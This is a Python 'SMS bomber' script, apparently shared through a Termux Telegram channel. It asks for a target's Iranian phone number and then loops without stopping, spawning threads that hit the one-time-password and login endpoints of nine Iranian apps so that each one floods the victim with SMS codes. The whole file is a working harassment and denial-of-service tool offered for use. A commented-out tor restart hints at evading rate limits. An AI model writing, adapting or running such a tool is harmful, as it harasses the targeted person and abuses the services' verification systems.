import os
import time
import requests
from threading import Thread
from colorama import Fore
from time import sleep
proxy = {"https": "127.0.0.1.8000"}
os.system("clear")
print(Fore.CYAN)
print("""



 __                  ___                 _               
/ _\_ __ ___  ___   / __\ ___  _ __ ___ | |__   ___ _ __ 
\ \| '_ ` _ \/ __| /__\/// _ \| '_ ` _ \| '_ \ / _ \ '__|
_\ \ | | | | \__ \/ \/  \ (_) | | | | | | |_) |  __/ |   
\__/_| |_| |_|___/\_____/\___/|_| |_| |_|_.__/ \___|_|   
                                                                                                                                                                                             _____                    

________________________
+t.Me/Termux_learning
+ coding by Mobin-Dan:)

""")
def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
        if "OK" in snapR.text:
            print (Fore.CYAN+"snap SEND")
        else:
            print (Fore.CYAN+"[+]snap SEND")
    except:
        print ("not send")

def shad(phone):
    #shad api
    shadH = {"Host": "https://web.shad.ir/"}
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        shadR = requests.post("https://shadmessenger128.iranlms.ir/", headers=shadH, json=shadD)
        if "OK" in shadR.text:
            print (Fore.RED+"[+]shad Send")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")

def gap(phone):
    #gap api
    gapH = {"Host": "core.gap.im"}
    try:
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
        if "OK" in gapR.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")

def tap30(phone):
    #tap30 api
    tap30H = {"Host": "tap33.me"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
        if "OK" in tap30R.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
            print ("[-] Not Send :(")

def emtiaz(phone):
    #emtiaz api
    emH = {"Host": "web.emtiyaz.app"}
    emD = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD)
        print ("[+] Send :)")
    except:
        print ("[-] Not Send :(")

def divar(phone):
    #divar api
    divarH = {"Host": "api.divar.ir"}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
        if "SENT" in divarR.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")

def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
        if "OK" in ruR.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")

def torob(phone):
    #torob api
    torobH = {"Host": "api.torob.com"}
    try:
        torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
        if "sent" in torobR.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")

def bama(phone):
    #bama api
    bamaH = {"Host": "bama.ir"}
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
        if "0" in bamaR.text:
            print ("[+] Send :)")
        else:
            print ("[-] Not Send :(")
    except:
        print ("[-] Not Send :(")


try:
    phone = str(input("↦Target Phone (+98xxxxxxx): "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=shad, args=[phone]).start()
        Thread(target=gap, args=[phone]).start()
        Thread(target=tap30, args=[phone]).start()
        Thread(target=emtiaz, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=rubika, args=[phone]).start()
        Thread(target=torob, args=[phone]).start()
        Thread(target=bama, args=[phone]).start()
        #os.system("killall -HUP tor")
        


except:
        print("not")
